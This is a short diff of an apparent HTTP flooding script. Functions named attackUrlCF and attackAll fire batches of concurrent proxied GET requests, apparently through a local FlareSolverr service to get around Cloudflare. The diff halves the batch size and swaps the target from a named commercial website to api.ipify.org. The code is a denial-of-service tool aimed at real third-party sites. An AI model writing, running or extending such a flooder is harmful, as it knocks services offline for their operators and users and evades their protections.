@@ -103,7 +103,7 @@ def attackUrlCF(baseUrl, threadNumber):
 			# checkIp()
 
 			requestsArr = []
-			for x in range(20):
+			for x in range(10):
 				requestsArr.append(grequests.get(url, headers=headers, proxies=proxies))
 			#res = requests.post(url, headers=headers, proxies=proxies, data=postData.replace('REPLACE', str(random.randint(0,99999))))
 			res = grequests.map(requestsArr, exception_handler=my_handler)
@@ -135,7 +135,7 @@ def attackAll():
 flareSolverUrl = 'http://localhost:8191/v1'
 
 for i in range(1):
-	Thread(target=attackUrlCF, args=['https://www.business2community.com', i]).start()
+	Thread(target=attackUrlCF, args=['https://api.ipify.org', i]).start()
 	time.sleep(30)
 input()
 
